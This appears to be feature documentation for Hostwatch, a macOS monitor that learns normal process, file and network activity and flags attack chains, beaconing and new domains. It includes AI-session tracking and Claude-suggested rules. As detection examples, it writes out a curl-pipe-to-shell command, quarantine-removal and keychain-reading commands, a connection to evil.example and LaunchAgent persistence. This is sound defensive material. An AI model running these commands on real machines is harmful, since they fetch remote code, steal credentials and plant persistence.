## Features

What Hostwatch does for you, in six groups. Each feature starts with a sentence or two, then the details.

### Learns what's normal

Hostwatch builds a picture of how your Mac normally behaves, and asks you only about what's new.

#### Patterns: learn normal, surface the strange

Hostwatch learns what your Mac normally does. Similar events become one pattern ("Slack connects to its servers"),
so you decide once instead of a thousand times, and anything new stands out.

Every event gets a **signature**: a normalized fingerprint of *who did what*. Events with the same signature are
grouped into one **pattern**. There are three kinds:

| Kind | Signature | Example |
|------|-----------|---------|
| process | parent program → executable | `Microsoft Excel → /usr/bin/osascript` |
| connection | process → proto, host bucket, port | `Slack → TCP internet:443`, `curl → TCP 45.33.*.*:8081` |
| file | process → mode, folder or file | `rg → r ~/Documents/work/src/*`, `rg → r ~/todo.txt`, `agent → r ~/.ssh/*  [SSH keys]`, `mds → r *  [ordinary files]` |

**Normalization** removes the parts that vary, so similar events really match. Your home folder becomes `~`.
`$TMPDIR`, UUIDs, hex IDs and version numbers become placeholders. This also applies to executable names that are
only a version, e.g. `claude/versions/#.#.#`.

**Fewer patterns where the detail says nothing:**

- **macOS's own programs:** what a program on the sealed system volume reads is one pattern for that program,
  `r *  [ordinary files]`. Which of thousands of system files `mds` or XProtect read says nothing, and nothing can
  change those programs. Kept specific: their writes, sensitive places (SSH keys, keychains, cookies, browser
  logins…), and shells, interpreters and command-line tools in `/bin` and `/usr/bin` (`cat`, `python3`, `zsh`),
  which read whatever a script tells them to.
- **Random temp names:** a file or folder in `/tmp` or `$TMPDIR` named like a temp file (a name, then random letters
  and digits: `zshVJbGMW`, `hostwatch.29Cjgb`) is one pattern per name: `r /tmp/zsh*`.
- **Projects:** what a tool reads inside a git project (the folder with its `.git`) is one pattern per project
  and program: `rg → r ~/Documents/git/devops/**`. Writes stay per folder, as do reads by shells and interpreters
  (`cat`, `python3`), and a project so near the root that its pattern would cover a whole area (never `r ~/**`).
- **Scratch trees:** a tree in `/tmp` or `$TMPDIR` is one pattern per tree: `r /tmp/site-shot/**`.
- **Homebrew:** reads inside a formula's tree are one pattern per formula, interpreters included:
  `Python → r /opt/homebrew/Cellar/awscli/**`.
- **Plain tools:** a shell or interpreter starting macOS's plain tools (`awk`, `cut`, `ls`, `du`…) is one pattern
  per folder: `zsh → /usr/bin/*  (plain tools)`. Tools attackers use (`curl`, `osascript`, `security`,
  `launchctl`, `defaults`…) and admin tools (`sudo`, `chown`, `diskutil`…) keep one pattern each, with their
  arguments.
- **Earlier patterns:** at launch, patterns saved by an earlier version that these rules now write as one are moved
  into it, with counts and dates added up. Only automatic ones move (routine Safe, or New nobody touched); your
  decisions, a rule's or an AI's stay as they are. On a real store: 21,172 → 7,600 patterns. Preview it with
  `Hostwatch --regroup-report` (read-only).

**Status.** Each pattern has a status: **New / Safe / Suspicious / Dangerous**. It also records who set it (you,
Claude, auto or baseline) and a short reason.

**Risk.** Each new pattern gets a local risk level, computed only from what is in the pattern. Some terms used below:
an *interpreter* or *shell* runs other code (python, bash, node…), and a *LOLBin* is a built-in system tool that
can also be misused (`curl`, `osascript`…).

- **routine:** auto-marked **Safe** (source `auto`). It is never sent to Claude and never highlighted as NEW.
  Routine covers:
  - reads of system, app, cache and container files
  - scratch writes (temp, caches, containers, prefs)
  - anything done by binaries on the sealed system volume, except LOLBins like `curl` and `osascript`
  - launchd/xpcproxy starting system services (one pattern)
  - loopback traffic
  - an app touching its own data.
- **high**, shown with a 🔥:
  - access to a sensitive place by a non-owner
  - persistence writes
  - executables running from temp/Downloads/`/Users/Shared`/volumes
  - GUI apps spawning shells/interpreters/LOLBins
  - LOLBins talking to public IPs on unusual ports.
- **normal:** everything else.

On 2.67M real events this gives about 7.3k patterns: 6.5k routine (auto-safe), about 750 normal and about 50
high-risk. The old per-folder scheme produced about 20k, all of them New.

**Seeing patterns and events:**

- **Show filter:** one setting that decides what the HUD, Events and Patterns show, all together. It is the same
  control on the Events and Patterns tabs and in the menu (*View ▸ Show*). The choices:
  - *All Activity*.
  - *Only New (not reviewed)*: unclassified, plus Suspicious/Dangerous decided only by an AI or the baseline.
  - *Only Important*: flagged plus new high-risk.
- **First sighting:** the event that first shows a pattern is tagged ✦ (Events) or **FIRST** (HUD). The *New*
  status means the pattern isn't decided yet.
- **Row colours:** flagged rows get a red or orange stripe, safe rows a green one. All rows use full-contrast text.
- **Columns:** the Events and Patterns tables use native columns: drag a header edge to resize any of them, click a
  header to sort. Widths are not remembered between launches yet.
  - Events show Time · Kind · Status · Process · PID · PPID · Detail.
  - Patterns show Status (🔥 = high-risk) · Kind · Process · Pattern · Decided By · Signer · Reason · Count ·
    First Seen · Last Seen.
- **Sorting and layout:** click a column header to sort, and again to reverse. Each table remembers its sort.
  Columns can be resized and reordered.
- **Ask the AI:** double-click a row to ask the AI (the engine you picked).
- **Searching and marking:** Patterns use the Show filter, can be searched and multi-selected. Right-click to mark
  one or many patterns, or **Mark All … From This Process** as a whole-process rule.
- **Decided By** column: *You*, *Rule: …*, *Baseline: Slack (…)*, *AI (on-device)* / *AI (Claude)*, *AI suggests
  Safe* (waiting for you), *Automatic (routine)* or *New*. **Needs You…** opens Rules ▸ Needs You.

**Group** (*No Groups*, *By Process*, *By AI Session*, the same control as on Events) is *By Process* by default: one
row per program (by name), with its patterns under it (*By AI Session* groups them by the coding-agent session that
produced them instead, see [AI sessions](#ai-sessions-what-claude-code-did)). The
program's row shows:

- the most serious status and risk among its patterns
- how many are New
- the kinds of activity
- the total count and first/last seen.

A program with one pattern stays a plain row. Marking, deleting or asking about a program's row acts on all its
listed patterns. Right-click it for *Show Only* that program. Columns: Status, Kind, Process, Pattern, Decided By,
Signer, Reason, Count, First Seen, Last Seen.

**Reading a pattern.** The Pattern column wraps (up to three lines), so a long pattern reads without widening the
column, and hovering it says what it means in plain words (*reads anything under ~/Documents/work*). The **inspector**
(the sidebar button at the right of the toolbar, shown by default) has the selected pattern in full: the plain
words, the pattern and program as selectable text, who decided it and why, the AI's suggestion, count and exact
first/last times, the last example it was seen in, the program's signature, and Safe / Suspicious / Dangerous
buttons. With several rows selected it marks them all. Clicking the selected row again deselects it (Escape clears
the selection), and an empty list says why.

**More in the Patterns tab:**

- Status tally chips at the top.
- Right-click **Copy Pattern**, **Copy Program Name(s)**, **Ask AI About This Pattern…**, **Delete Pattern** /
  **Delete Selected Patterns**.
- The toolbar's **Delete All N Patterns** starts over (asks first).

**One-offs.** A one-off is a pattern seen only once that is not high risk, not Suspicious or Dangerous, and not
decided by you or your rules. Examples: a command typed once, a one-time connection. It is recorded like any other,
so detection works the first time.

- **Hidden by default:** the Patterns tab hides it unless **Seen Once** is on. Search and scoped lists find it anyway.
- **Removed after 7 days:** tidying removes it when it hasn't happened again for 7 days, if it's undecided or Safe
  only automatically (routine), unless an open story uses it. Ones an AI or the baseline decided stay.
- **If it comes back:** if it happens later, it's simply new again.

**AI suggests, you decide.** An AI can propose a status for New patterns, but you stay in charge:

- **Asking:** *Ask AI for Suggestions* (Rules ▸ Needs You) sends up to 40 New patterns (high-risk first, then most
  recent), with code-signing facts, to the on-device model and/or Claude. For Claude that's one
  headless `claude -p` call, about 8 s and $0.03.
- **Suggestions only:** each verdict is stored as a **suggestion** on the pattern. Nothing changes until you
  **Accept** it.
- **Automatic suggestions:** *Suggest for new patterns automatically* (Settings ▸ AI) repeats this every 90 s for
  patterns older than a minute.
- **Automatic accept:** *Accept AI suggestions without asking* applies them by themselves, except for high-risk
  patterns.
- **Classify with AI** (Events and Patterns toolbars) does it for every New pattern that no AI has looked at. It
  works in batches of 40, high-risk first, with a progress bar and Cancel. The popover shows the count, the engine
  and the rough cost (on-device free, Claude about $0.03 per batch). It also lets you choose whether to **apply the
  verdicts** or **keep them as suggestions**. A failing Claude (offline, not installed) stops the run.
- **Limits:** no AI overrides a decision you made or suggests Safe for a high-risk pattern. No AI trusts an
  interpreter, shell or similar tool (python, bash, node, curl, osascript…), because they run whatever they're told.
- **Ask AI:** a single **Ask AI** verdict also becomes a suggestion for that event's pattern.

**Combining patterns.** You can merge several similar patterns into one, so you decide about them together:

1. Select two or more patterns of one kind in Patterns.
2. Right-click (or *Mark Selected*) ▸ *Combine… into One Pattern*.
3. A sheet proposes the shared pattern: their common shape, token by token, with `*` where they differ
   (`r ~/Documents/work/alpha/*` + `…/beta/*` → `r ~/Documents/work/*/*`). You can edit the program and the pattern.

The combined pattern must cover every chosen pattern and stay specific (the general rule below, bare wildcards
refused). What happens next:

- **Merging:** every existing pattern it covers is merged too. Counts add up, and first and last seen span them.
- **Status:** the most serious status wins (Dangerous, then Suspicious, and New when Safe and New are mixed).
- **New activity:** from then on, activity whose own pattern it matches joins it instead of creating a new one.
  Rows already on screen follow it.
- **Undo:** *Separate Combined Pattern* undoes it. New activity makes its own patterns again.

**The general rule: no pattern covers a whole area.** This applies to every program (`SignatureBuilder.specificPath`).
In file patterns, `r` is the mode (read).

- **Wildcard depth:** a wildcard needs at least 2 folders below home (`~/Documents/work/*`) or 3 elsewhere
  (`/Users/Shared/tools/*`).
- **Shallow files:** a file in a shallower folder is its own pattern (`r ~/todo.txt`, `r ~/Documents/a.pdf`,
  `r /tmp/x.log`, `r /usr/bin/ls`).
- **Deep trees:** patterns name the file's folder. For apps, trees deeper than 4 folders below home (5 elsewhere) end
  in `/**` there (`~/Projects/app/node_modules/a/**`). Interpreters and shells always get the exact folder.
- **Never allowed:** so `r *`, `r ~/*`, `r ~/Documents/**`, `r /*`, `r /tmp/*` or `r /Users/**` never exist and
  can't be a learned Safe rule. "Mark All … From This Process ▸ Safe" is gone. Suspicious or Dangerous for a whole
  program still work.
- **Older versions:** undecided or automatic wide patterns from earlier versions are dropped at launch. Ones you
  decided stay.
- **Effect:** on a real day of history, patterns went from 1,219 to 2,803, mostly routine (auto Safe). Patterns to
  decide went from 150 to 227.

Labelled places stay as before:

- **sensitive places**, for any access: SSH/GPG keys, cloud and registry credentials, keychains, TCC, cookies,
  Safari/Mail/Messages data, browser credential stores, local accounts, sudoers. These are tagged `[label]`.
- **autostart locations**, for writes only: LaunchAgents/Daemons, cron/at/periodic, login items and shell rc files.
  These are tagged `[persistence]`.
- **an app's own data folder**: `~/Library/Application Support/<App>` or `~/.<app>`, when the name matches the
  actor. These are tagged `[own data]`.

**Connections:**

- Public IPs on web ports (80/443/53/853/123) become `internet`. Other ports keep the /16.
- Loopback, LAN, link-local, CGNAT and multicast are named.
- Ports ≥ 49152 become `ephemeral`.

**Interpreters and tools** get extra care, because they run whatever they're told:

- **Launches name what was run:** launches of interpreters and tools (perl, python, bash, ditto, curl, osascript…)
  name what was run, not just the program.
  - For an interpreter, the script: `bash → /usr/bin/perl ~/bin/build.pl`.
  - For `-c`/`-e`, the code, first 80 characters: `sh -c ‹curl -s https://x/p | sh›`.
  - Otherwise the arguments, with paths and numbers normalised, up to ~120 characters:
    `ditto -x -k ~/Downloads/app.zip ~/Downloads`.
  - A bare program run alone stays as it is.
- **Network and files:** for interpreters and shells (python, bash, node, curl, osascript…), network patterns name
  the destination's domain (`TCP pythonhosted.org:443`) or address, never `internet`. File patterns follow the
  general rule (above) with the exact folder even in deep trees.
- **No wholesale trust:** *Mark All … From This Process ▸ Safe* is disabled for them. A learned Safe rule that
  covers them broadly is refused. The baseline never trusts them, macOS's own `/bin/bash` or `/usr/bin/python3`
  included.
- **Older versions:** blanket trust from earlier versions (whole-process Safe, or Safe by AI or the baseline) is
  undone at launch. Your own per-pattern decisions stay.

**Built-in safe patterns.** Some of macOS's own behaviour is the same on every Mac, so it is decided as routine out
of the box (`BuiltInSafe`):

- any program *reading* `~/.CFUserTextEncoding` (CoreFoundation's text-encoding preference)
- `/usr/sbin/networksetup` running `/bin/sh -c ‹/bin/cp …/SystemConfiguration/preferences.plist …›` (its settings
  backup)
- `sh`/`bash /usr/libexec/tmp_cleaner` (Apple's temp clean-up script)
- SystemUIServer running `screencapture …com.apple.screenshot.launcher…` (a screenshot you took).

Only exact patterns count. When a parent is named, it must be that program on the sealed, read-only system volume.
A copy elsewhere, or the same command from another program, doesn't count. Signing still applies (a swapped binary
is high-risk), and stories ignore automatic decisions. Existing New patterns that match are decided at the next
launch.

Your own developer activity (scripts, hooks, `kubectl`, `codesign`…) isn't universal, so it's not built in. Mark
it, combine it or let rules learn it.

**Code signing** refines the risk level. It looks only at the binary the pattern names (what runs, or what acts).
Each binary is inspected once per version with the Security framework: signed or not, ad-hoc, Apple, Team ID,
organisation, CDHash, quarantine flag. Its signature is fully validated in the background, and checked again when
the file changes.

- **Unsigned or ad-hoc code that is quarantined or runs from a download/temp folder** → high. Unsigned code
  elsewhere (Homebrew, your builds, bundled runtimes) is left to the path rules.
- **Apple or a trusted developer** doing non-sensitive things → routine. Sensitive places, autostart writes and
  spawning shells/LOLBins keep their rules.
- **Signature no longer matches the binary** (modified) → high.
- **Binary replaced:** a known path whose signer changes in a way an update wouldn't explain → high, plus a Stories
  stage. That means signed → unsigned/ad-hoc, Apple → non-Apple, or a different Team ID.
- **Trusted developers** start as the Team IDs of the signed, non-quarantined apps already in `/Applications` (your
  baseline). New vendors stay untrusted until you right-click a pattern → **Trust Developer “…”**. Remove one with
  **Stop Trusting**. Patterns are re-scored right away. Facts are saved in
  `~/Library/Application Support/Hostwatch/signing.json`.
- **Measured** on today's history: normal patterns 247 → 191. The 57 that became routine are all Developer-ID apps
  (Claude Code, Cursor, Chrome…) doing everyday things.
- **Debug tool:** `Hostwatch --signing-check <path>…` (set `HOSTWATCH_SIGNING_DB` for a scratch database).

**Tidying (routine noise only).** Hostwatch tidies 30 seconds after launch and then daily. Routine Safe patterns are
the ones decided automatically as ordinary: system reads, caches, scratch writes. Tidying does two things:

- **Removes old ones:** routine Safe patterns not seen for 30 days are removed. They come back if they happen again.
- **Folds look-alikes:** routine Safe patterns of one program that differ only in random parts are folded into one
  combined pattern, marked automatic. Random parts are a token with digits and letters such as `cache-aB#dE#`,
  `<hex>`, `<uuid>`, or a long mixed-case code. A fold needs at least 3 patterns, must pass the not-too-wide rule
  and may cover nothing but routine Safe patterns.

Nothing New, reopened or decided by you, a rule, the baseline or an AI is touched. If activity that joins a fold
later isn't routine, the fold goes back to New. On a real store: 16,490 → 15,963 on the first run (62 folded into
14), and pruning grows as patterns age. The Patterns footer shows the last result.

**Where patterns are saved:** `~/Library/Application Support/Hostwatch/signatures-v2.json`, plus a journal of
patterns changed since (`signatures-v2.journal`). The journal is folded into a new snapshot after a decision or when
it grows. The old `signatures.json` is not migrated and can be deleted.

Debug helper: `Hostwatch.app/Contents/MacOS/Hostwatch --signature-report <history.jsonl>` prints how a history file
groups into patterns and risk levels (`REPORT_KIND=file|net|exec|routine|normal|high`, `REPORT_GREP=…`,
`REPORT_TOP=n`).

#### Rules tab: Needs You, Rules, Decisions

Your to-do list and your decisions in one place: what's waiting for you, the rules that decide for you, and
everything you've already decided.

Every pattern is decided by **you**, a **rule** (learned or baseline), or an **AI suggestion** you accepted. That is
also the order of authority: you come first. The Rules tab shows this in three views. Its toolbar label counts what
waits for you.

- **Needs You:** what waits for your decision. Rebuilt live as patterns change. Interpreters, shells and Hostwatch
  itself aren't listed. It shows:
  - New patterns, one row per app with its reasons (see the baseline section).
  - The AI's suggestions (*AI suggests: Safe ×3 · on-device AI*) with **Accept**, **Trust**, **Dismiss** and *⋯*
    (Show in Patterns, Mark Suspicious).
  - Claude's rule proposals, with **Approve** / **Reject**.
- **Rules:** baseline rules (code signatures, no AI: **Update Baseline**) and learned rules (**Suggest Rules…**).
- **Decisions:** who decided which patterns, by app. The groups are *Patterns AI decided*, *Patterns you decided*
  (one by one, each covers only itself), *…decided by learned rules* and *…decided by baseline rules*. AI and your
  decisions each have **Undo** (back to New).
- **In plain words:** every learned rule and proposal reads as a sentence: *who* does *what* → *what happens*,
  e.g. **git** reads anything under ~/Documents/ProcessHUD → **Safe: decided for you, never asked about, left out
  of Stories**. A proposal also lists *If you approve*: how many New patterns change now, that future matches are
  decided without asking, and how many of your decisions it agrees with. *Details* shows the exact match (kind ·
  program → pattern). A baseline rule says what it trusts: the kinds of behaviour the app showed in its first week,
  as long as its signature matches.
- **N patterns ›:** every row (needs-you apps, baseline and learned rules, decided groups) has *N patterns ›*. Click
  it to list those patterns in place: high risk first, up to 40, with *Open in Patterns* for all of them.

#### Rules learned from your decisions

Mark a few patterns yourself and Claude suggests rules that decide similar ones for you. Each rule is checked against
your own decisions, and nothing changes until you approve it.

How to use it:

1. Mark a few patterns yourself.
2. Click **Suggest Rules…** (Rules ▸ Rules ▸ Learned rules).
3. Review the proposals that pass the checks. **Approve** applies a rule. **Reject** drops it.

Approved rules are saved in `rules.json`. Suggesting rules needs Claude, so it's disabled when the engine is *Apple
On-Device*.

**What is sent:**

- your decisions (patterns *you* marked), with secrets masked
- your existing rules
- the story chains you always ignore.

Claude's own verdicts are deliberately not used, so rules don't amplify the AI.

Your **Safe** decisions are sent only for **regular** patterns: seen at least 5 times, the first and last time at
least an hour apart. A Safe rule stops questions for good, so it must stand on behaviour that keeps happening.
Dangerous and Suspicious decisions are always sent, because something that ran once may be exactly what to catch
again.

**What comes back:** up to 8 rules. Each has a `kind` (exec/net/file/any), a `process` glob, a `pattern` glob (`*`,
`?`, case-insensitive) and an action (Safe/Suspicious/Dangerous), with a short rationale.

Every proposal is checked locally before you see it:

| Check | Effect |
|-------|--------|
| matches one of your decisions with a different status | **refused** (conflict) |
| program and pattern both name fewer than 4 letters/digits | **refused** (too general) |
| matches no pattern, or > 25% of all patterns (with ≥ 200 patterns) | **refused** |
| based on none of your decisions | warning |
| a Safe rule covering New high-risk patterns | warning (shows how many) |
| a Safe rule covering an interpreter or shell broadly (program or pattern < 4 letters) | **refused** |
| a Safe rule whose matching decisions are all on patterns seen < 5 times or within an hour | **refused** (not regular) |

**While it runs:** **Needs You** shows a progress card with how many of your decisions were sent, a live timer and
**Cancel**. The Rules tab reads *Rules (…)*. Afterwards a result line says how many proposals came back and how many
passed the checks, or why none did.

**Precedence**, from strongest to weakest:

1. your markings and the baseline
2. your rules
3. Claude/on-device verdicts
4. automatic routine.

A rule's verdict counts as yours. It satisfies *Only New (not reviewed)*, and a Safe rule removes matching steps
from Stories.

**Each rule's own regression test.** At approval, a rule stores the decisions it must keep matching (examples) and
those it must never match (all your other decisions). It is re-checked at launch and whenever you mark something.

- **Paused:** if it now matches a counter-example, loses an example, or contradicts any of your decisions, it is
  **paused** with the reason.
- **Resume or delete:** it stays paused until you resume it (if it passes again) or delete it.
- **Effect:** patterns a paused or deleted rule had classified go back to their own state.

`Hostwatch --suggest-rules` is a dry run for development: it asks Claude, checks the proposals and prints them,
changing nothing.

### Connects the dots

One event rarely means much on its own. Hostwatch links related ones into a story.

#### AI sessions: what Claude Code did

A coding agent (Claude Code, the Cursor agent, Codex, Gemini CLI) is one process that starts many others: shells,
`git`, builds, `curl`. Hostwatch follows each agent process and its whole tree as one **session**, so you can see
what one session did, not just what `zsh` or `git` did in general.

- **Events ▸ Group:** *No Groups*, *By Process* or *By AI Session*, next to the Show buttons. *By AI Session* gives one
  row per session with its events under it, the rest under *No AI session*. A session row is a band across the
  list, the way `claude --resume` lists sessions: the maker's mark, the topic, then *ProcessHUD · main · 12 min ·
  5 conn*, and on the right *Only this session* (the list keeps only that tree, *All sessions* takes it off),
  *Patterns*, the worst status among its events and their count. Groups open when shown (one you fold stays folded while the window is open). Right-click a band for the
  same actions and the Claude session id.
- **The maker's mark:** a small mark of the agent's maker drawn by Hostwatch: Anthropic's logomark for Claude Code,
  OpenAI's knot for Codex, Google's four-colour G for Gemini CLI, a cube for the Cursor agent. It appears on session
  bands and next to the kind of an agent's event.
- **The topic:** Claude Code's title for the session (`ai-title`, or a title you set yourself, which wins), else the
  first prompt, else the project folder. It comes from the transcript the guard hook names, so it needs the Claude
  Code guard on, and it's looked up again until found, since Claude titles a session a few turns in. The branch comes
  from the same place.
- **How events are matched:** by process lineage at the moment each event arrives. A child that daemonizes and is
  reparented to `launchd` keeps its session. An agent started by an agent (a sub-agent) is part of the outer session.
  Claude Code's own helper processes (pty hosts, spare daemons) aren't sessions.
- **Agents already running when Hostwatch starts** are picked up from the process list (once a minute, or every few
  seconds while Running Now is open), with lineage for processes whose start wasn't seen.
- **Running Now ▸ Group:** the same control groups the running processes under their parent process (*By
  Process*) or under the AI session they belong to (*By AI Session*), with CPU, memory, threads and writes added up
  per group and the count of processes in the PID column.
- **Without the guard hook:** Claude Code keeps a session's transcript under `~/.claude/projects/`, in a folder
  named after the working directory, so Hostwatch finds the transcript that started with the session and names it
  from there. A session with no topic yet is named by where and when it started (*Claude in ~, 16:24*).
- **Patterns ▸ Group ▸ By AI Session:** one band per session with the patterns it produced under it, the rest under
  *No AI session*. The band offers *Mark all Safe…* (after asking) for everything the session did so far.
- **Everywhere else:** in the Events table an agent's event carries the maker's mark next to its kind (the session
  is in the tooltip), a destination on the Network tab that a session
  reached carries a *via Claude · ProcessHUD* tag, and a story that happened inside a session starts with its name. In
  Time Travel, sessions are replayed from the window's recorded process starts, so the grouping and the column work
  for yesterday's session too (named when the saved list knows the pid and start, else by pid).
- **For Claude:** the MCP tool `agent_sessions` lists them; `trace_process` with a session's pid shows what it did.
  The list is saved in `agent-sessions.json` while Hostwatch runs.

#### Stories: chains, not single events

Attacks are rarely one event. Hostwatch links small, harmless-looking steps of one program and its children (a
download, a shell, a new login item) into one story, and warns you when they add up.

One event rarely proves anything. An app starting `sh`, a download, an outbound connection are all everyday. Attacks
are *chains*.

So Hostwatch tags suspicious **stages** and adds up their weights per **process tree** over a 15-minute window. A
process tree is one program and the processes it started.

| Stage | Example | Weight |
|-------|---------|--------|
| Download | write into `~/Downloads`, `/Users/Shared` | 1 |
| Quarantine removed | `xattr -d com.apple.quarantine …` or `xattr -c(r) …` (not `-p`/`-l`) | 3 |
| Ran downloaded/temp file | exec from Downloads, temp, `/Users/Shared`, volumes | 2 |
| App spawned shell | Slack/Office/a browser starting `sh`, `python`, `osascript` | 3 |
| System tool | `curl`, `nc`, `osascript`, `base64`, `security`, `launchctl` … | 1 |
| Encoded/piped command | `curl … \| sh`, `base64 -d`, `osascript -e`, `python -c` | 3 |
| Autostart write | LaunchAgents/Daemons, login items, shell rc files | 4 |
| Credential access | keychains, SSH/cloud keys, browser stores, `security find-generic-password` (unless a trusted signed parent reads its own item) | 3 |
| Outbound connection | to a public IP/host | 1 |
| Unsigned download ran | unsigned/ad-hoc code, quarantined or in a download/temp folder | 3 |
| Binary replaced | a known path whose signer changed (see Code signing) | 5 |
| New domain | first contact with a domain after the baseline (see New domains) | 2 |
| Beaconing | steady-interval contacts from an untrusted program or to a raw IP/new domain | 3 |
| Raw-IP connection | public IP, unusual port, no DNS answer, untrusted program | 2 |

**Where you see stories:**

- **Banner:** a pinned banner at the top of the HUD. Double-click it to open it.
- **Stories tab:** the full timeline. **Ask AI** sends the whole chain.
- **Sound:** a sound plays when a story first fires.
- **Menu:** **Stories** in the menu.

**What you can do in a story:**

- **Mute:** **Always Ignore This Chain** mutes the same origin + set of stages.
- **Delete:** the trash button deletes it.
- **Related:** *Possibly related (within 30 min, no direct link)* lists stories that may belong to the same attack.

**When a story fires:**

- **Normal trees:** at least two stages, score ≥ 5, and a strong stage (quarantine removal, encoded command,
  autostart, credentials) or an app spawning a shell.
- **Your own terminal/IDE:** trees started there need score ≥ 6 with a strong stage. So `go run` from `$TMPDIR` plus
  `curl` stays quiet.
- **Dangerous:** at score ≥ 8, or autostart + network, or quarantine removal + running the file.

**How trees are formed:** each app action, launchd job, or command typed in a terminal is its own tree. Its children
stay together. A file written by one tree and then run (or un-quarantined) by another joins the stories. Browser
`.crdownload` files are matched too, e.g. *Google Chrome → xattr → Cleaner*: download · quarantine removed · ran it ·
LaunchAgent · beacon.

**Your Safe marks:** patterns **you** marked Safe never feed stories. Claude/baseline verdicts do, because they judged
one step alone.

**Command lines:** new processes now carry their **command line**, shown in the Activity list and given to Claude.
The collector masks secrets like tokens, passwords and URL credentials.

**Tested:** on one day of real history (2.67M events) there were 2 stories, both Claude Code itself running
`security` and reading `~/.gnupg`. Synthetic attack chains fire as Dangerous. Replay any history:
`Hostwatch --story-replay <history.jsonl>`.

#### Story window

Double-click a story to read it like a timeline: what ran, what it did, and why each step counts.

**Double-click a story** (or **Show Chain**) to see the whole chain, event by event, on a vertical timeline.

- **Each step** shows its time, its stage (coloured for strong stages) and one sentence, such as "sh started curl",
  "curl connected to evil.example:443" or "sh wrote ~/Library/LaunchAgents/x.plist". It also shows the command line
  or address, and why it counts.
- **Lineage:** steps are indented by process lineage, so a child runs below its parent. A *Processes in this chain*
  tree lists them with their signers.
- **All activity** adds everything those processes did from a minute before to two minutes after the story. It comes
  from history, or from what's still in memory when history is off. These events are dimmed between the suspicious
  steps.
- **Per step:** double-click or right-click a step to ask AI about it, show it in the timeline, or copy it.
- **At the bottom:** *Ask AI About This Story*, *Show in Timeline*, *Dismiss* and *Always Ignore This Chain*.

### Watches the network

Every connection and domain, and a firewall that can ask before anything new goes out.

#### Network: new domains

Every website and server your apps talk to, in one list. A domain your Mac has never contacted before is marked new.

Hostwatch keeps an inventory of every **registrable domain** your programs connect to. That is the name someone
registers, so `edge.slack.com` is listed as `slack.com`. For each domain it records first and last seen, the connection
count, the hostnames and the programs. The list is saved in `~/Library/Application Support/Hostwatch/domains.json`.

- **Counted:** hostnames confirmed by DNS, or named on the command line (inferred connections).
- **Not counted:** reverse-DNS provider names, IP-only connections, `.local`/`.arpa` names, and macOS system daemons.
  The daemons talk to Apple constantly.

**How Hostwatch learns what's normal.** On first launch, every domain in recorded history counts as known. The next
**hour** is a learning period. To stop it early, use Network tab → *End Learning Now*.

Some domains are not learned, even during learning. A domain first reached by unsigned, ad-hoc or quarantined code, or
by a program in Downloads / Shared / a volume, stays new.

**What happens with a new domain.** A domain first contacted after this baseline is new. For **1 hour**, its
connections carry a purple **NEW DOMAIN** badge in the HUD and the Events list. During that time they:

- **Pass filters:** they pass *Only Important* and *Only New*.
- **Feed Stories:** they add a **New domain** stage (weight 2) to Stories. For example, *Slack → sh → curl* fetching
  from a never-seen domain is Dangerous.

**The Network tab.** Open it with ⌘5, or *Network* in the menu, which shows a badge. It is one timeline of
destinations, newest first. Each row is a domain, or an address without a name.

- **Columns:** Last Seen · Destination · Firewall · Domain · Programs · Connections · First Seen. Every column sorts.
- **Domain status:** New, Seen, Known, Baseline, or on a threat list.
- **Firewall:** what the firewall does there. Passes, Asks or Would ask, Blocks or Would block, Blocked by you,
  Waiting for you.
- **Waiting connections:** connections held in Ask wait in a strip on top.
- **Filters:** All, New Domains (first seen in the last 24 h), Blocked & Undecided. The filter you picked is
  remembered.

Open a row to see the programs that connected, with **Block** / **Allow**. These mark the pattern, as in Patterns. On a
blocked destination you get **Allow Instead**, and **Show Program in Finder** takes you to the program.

Right-click a row to **Mark Known** or mark as not known, to Block or Allow, to copy, or to **Forget** the domain.

**Block one domain for one app.** Block and Allow decide the connection's pattern, and an ordinary app has one
pattern for the whole web (`TCP internet:443`): blocking it stops the app everywhere. To stop an app reaching just
one domain, right-click the domain ▸ *Block for an App* and pick the app (the apps that reached it are listed), or
right-click one of its connections ▸ *Block example.com for Slack*. The rule covers the domain's hosts
(`api.example.com` counts under `example.com`), comes before any pattern status (a Safe pattern doesn't let it
through), and shows as *Blocked by you* with an **Unblock** button. It is kept with the firewall's other data and
stops connections in Ask and Strict. In Watch it shows what it would block. A connection already open finishes, and
one let through in the last five minutes may pass until that answer runs out.
Forget does three things:

1. The domain is new again next time.
2. Its connections leave the firewall list.
3. The Allow or Block you gave them in the firewall (question, Network tab) is reset, so they're asked about again.

Decisions made in Patterns stay. A firewall decision is per pattern, so other destinations of that pattern are asked
again too.

**Testing.** Run a replay to list the domains that would be flagged after that much learning:
`REPLAY_LEARN_MINUTES=30 Hostwatch --story-replay <history.jsonl>`.

#### Domain details and risk score

Open a domain to see who contacted it and when, with a simple risk score and the reasons behind it.

To open it, double-click a domain in the Network tab, or right-click ▸ *Details & Ask AI…*. The window shows the domain
with chips for New / Usual / Known, beaconing and untrusted programs.

Next comes a **local risk score (0–100)**, with each reason and its points:

| Reason | Points |
| --- | --- |
| Not usual on this Mac | +20 |
| First seen in the last 24 h (with not usual) | +10 |
| Reached by unsigned, ad-hoc, quarantined or downloaded software | +30 |
| Beaconing | +25 |
| An often-abused top-level domain, the last part of the name (.xyz, .top, .zip, …) | +15 |
| An internationalised `xn--` name | +15 |
| A random-looking (generated) name | +15 |
| Known | −30 |
| Usual (baseline) | −20 |
| Used by 3+ programs | −10 |

Below the score you see:

- the hostnames and current addresses
- first and last contact (you can open the first in Time Travel)
- the programs, with their signers
- recent connections

**Ask AI** works with Claude or on-device, with the same bar as event details. It answers with a verdict, a confidence
and its own **RISK** score. The evidence it gets is in the collapsed section, and you can edit it first.

#### Beacons and raw-IP connections

Flags two habits of malware: calling home at a steady rhythm, and connecting straight to an IP address without looking up a name.

These are two more signals per connection. Like new domains, they are not part of pattern keys.

**Beaconing** is one program contacting one destination (a domain, or an IP without a name) at a steady interval.
Hostwatch looks for:

- at least 6 contacts
- an average gap of 10 s–1 h
- jitter ≤ 25%, meaning the gaps vary by at most a quarter

Many apps do this legitimately, such as Slack's heartbeat every ~2 min, or telemetry. So it only counts when the
program is **untrusted or a system tool** (`curl`, `python`, …), or the destination is a **raw IP or a new domain**.
Then the connection carries **BEACON ~60s**, and a strong **Beaconing** stage goes to Stories.

A **raw-IP connection** goes straight to an address without a name lookup. Hostwatch flags it when all of these hold:

- the destination is a public IP
- the port is unusual (not 80/443/53/853/123)
- no DNS answer came before it
- the program is untrusted or a system tool

It gets a **RAW IP** badge and a **Raw-IP connection** stage in Stories.

